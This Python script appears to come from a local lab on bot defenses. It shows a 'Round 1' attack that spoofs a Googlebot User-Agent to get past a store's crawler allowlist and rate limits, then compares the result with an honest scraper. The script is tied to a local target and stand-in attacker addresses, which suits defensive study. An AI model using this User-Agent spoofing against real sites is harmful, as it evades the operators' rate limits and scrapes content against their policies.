"""Round 1 attack: say you are Googlebot.

The store's crawler allowlist (DEFENSE_LEVEL=0) trusts the User-Agent. A scraper
that would be throttled to 30 requests a minute sets one header and gets the
crawler's 600. This is not exotic: HUMAN measured 5.7% of requests presenting an
AI-crawler User-Agent as spoofed (2025), and fake Googlebots have been a staple of
scraping for twenty years.

Expected: L0 -> 200/200 products (fast lane). L1+ -> 30/200 (the PTR of 192.0.2.77
is static-192-0-2-77.attacker-hosting.example, not under googlebot.com).

    python attacks/round1_ua_spoof.py
"""

from __future__ import annotations

import httpx

from _common import ATTACKER_IP, BASE_URL, UA_GOOGLEBOT, UA_SCRAPER, headers, report, require_local_target, scrape_catalog


def run(base: str = BASE_URL) -> dict:
    require_local_target(base)
    with httpx.Client(base_url=base, timeout=10) as c:
        c.post("/admin/reset", params={"scope": "budgets"})   # a fresh minute, same caches
        honest = scrape_catalog(c, headers("bot-honest-scraper", ATTACKER_IP, UA_SCRAPER))
        c.post("/admin/reset", params={"scope": "budgets"})
        spoof = scrape_catalog(c, headers("bot-ua-spoof", ATTACKER_IP, UA_GOOGLEBOT))
    return {"honest": honest, "spoof": spoof, "scraped": spoof["scraped"], "total": spoof["total"]}


if __name__ == "__main__":
    print("=== Round 1: honest scraper, then the same scraper claiming to be Googlebot ===")
    out = run()
    report("honest scraper ", out["honest"])
    report("UA = Googlebot ", out["spoof"])
